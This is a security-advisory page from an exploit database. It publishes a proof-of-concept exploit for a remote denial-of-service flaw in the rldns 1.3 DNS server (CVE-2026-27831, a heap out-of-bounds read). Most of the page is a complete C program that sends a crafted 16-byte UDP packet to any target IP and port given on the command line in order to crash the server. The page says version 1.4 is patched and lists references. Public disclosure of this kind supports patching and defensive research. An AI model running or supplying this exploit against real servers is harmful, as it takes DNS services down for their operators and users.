---
title: rldns-1.3 remote denial of service
url: https://cxsecurity.com/issue/WLB-2026020028
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-02-26
fetch_date: 2026-02-27T04:07:03.066455
---

# rldns-1.3 remote denial of service

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **rldns-1.3 remote denial of service** **2026.02.26**  Credit:  **[antonius](https://cxsecurity.com/author/antonius/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2026-27831](https://cxsecurity.com/cveshow/CVE-2026-27831/ "Click to see CVE-2026-27831")**  CWE: **[CWE-125](https://cxsecurity.com/cwe/CWE-125 "Click to see CWE-125")** | |

/\*
# Exploit Title: rldns-1.3 remote denial of service
# Google Dork: N/A
# Date: 2026-02-26
# Exploit Author: Antonius
# Vendor Homepage: https://indodev.asia
# Software Link: https://indodev.asia/downloads/rldns-1.3.tar.bz2
# Version: 1.3
# Tested on: Kali linux 2025
# CVE : CVE-2026-27831
# Description:
This is proof of concept exploit for remote heap based out-of-bound read at rldns version 1.3.
rldns is an open source DNS server for linux, freebsd & netbsd, running on x86\_64 architecture.
Rldns Version 1.3 has a heap-based out-of-bounds read that leads to denial of service. Version 1.4 contains a patch for the issue.
Vulnerability discovered by : Antonius
\*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
int main(int argc, char \*argv[]) {
int sock;
struct sockaddr\_in server;
unsigned char packet[] = {0x12, 0x34, 0x34, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x41, 0x42, 0xff};
if (argc < 3) {
printf("[-] usage : ./exploit <target ip> <port number>");
exit(-1);
}
char \*ip = argv[1];
int port = atoi(argv[2]);
sock = socket(AF\_INET, SOCK\_DGRAM, 0);
if (sock < 0) {
perror("[-] failed to create socket");
exit(-1);
}
server.sin\_family = AF\_INET;
server.sin\_port = htons(port);
inet\_pton(AF\_INET, ip, &server.sin\_addr);
ssize\_t sent = sendto(sock, packet, 16, 0, (const struct sockaddr \*)&server, sizeof(server));
if (sent < 0) {
perror("Sendto failed");
} else {
printf("Successfully sent %zd bytes to %s:%d\n", sent, ip, port);
}
close(sock);
return 0;
}

**##### References:**

https://github.com/bluedragonsecurity/rldns-1.3-heap-out-of-bounds-vulnerability-fixed-in-rldns-1.4

https://medium.com/@w1sdom/heap-based-buffer-over-read-vulnerability-in-rldns-1-3-5da3bccdc031

https://www.cve.org/CVERecord?id=CVE-2026-27831

https://packetstorm.news/files/id/216107/

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026020028)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top